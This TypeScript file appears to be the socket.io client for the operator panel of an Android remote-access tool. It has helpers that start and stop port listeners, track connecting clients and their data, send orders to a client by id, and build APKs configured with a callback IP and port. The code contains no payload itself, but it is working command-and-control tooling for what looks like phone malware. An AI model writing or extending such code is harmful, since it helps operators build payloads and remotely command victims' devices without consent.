// Singleton socket.io client + small emit helpers used by the UI.
// The connection itself lives in @/lib/config (same-origin `io()`).

import { socket } from '@/lib/config'

type Listener = {
  onConnect?: () => void
  onDisconnect?: (reason: string) => void
  onConnectError?: (err: Error) => void
  onEvent?: (event: string, ...args: any[]) => void
}

let currentListener: Listener | null = null
let bound = false

function bindOnce() {
  if (bound) return
  bound = true
  socket.on('connect', () => currentListener?.onConnect?.())
  socket.on('disconnect', (reason: string) => currentListener?.onDisconnect?.(reason))
  socket.on('connect_error', (err: Error) => currentListener?.onConnectError?.(err))

  const events = [
    'initial_clients',
    'listeners_update',
    'listener_error',
    'client_connected',
    'client_disconnected',
    'client_data',
    'sys_log',
    'stats_update',
    'build_log',
    'build_success',
    'build_failed',
  ] as const

  for (const ev of events) {
    socket.on(ev, (...args: any[]) => currentListener?.onEvent?.(ev, ...args))
  }
}

bindOnce()

export function getSocket() {
  return socket
}

export function setSocketListener(l: Listener) {
  currentListener = l
}

export function connectSocket() {
  if (!socket.connected) socket.connect()
}

export function disconnectSocket() {
  socket.disconnect()
}

export function emitStartListener(port: number) {
  socket.emit('start_listener', port)
}
export function emitStopListener(port: number) {
  socket.emit('stop_listener', port)
}
export function emitOrder(id: string, order: string, params: Record<string, any> = {}) {
  socket.emit('order', { id, order, params })
}
export function emitBuildApk(config: { ip: string; port: number | string }) {
  socket.emit('build_apk', config)
}
export function emitBuildApkAdvanced(config: Record<string, any>) {
  socket.emit('build_apk_advanced', config)
}
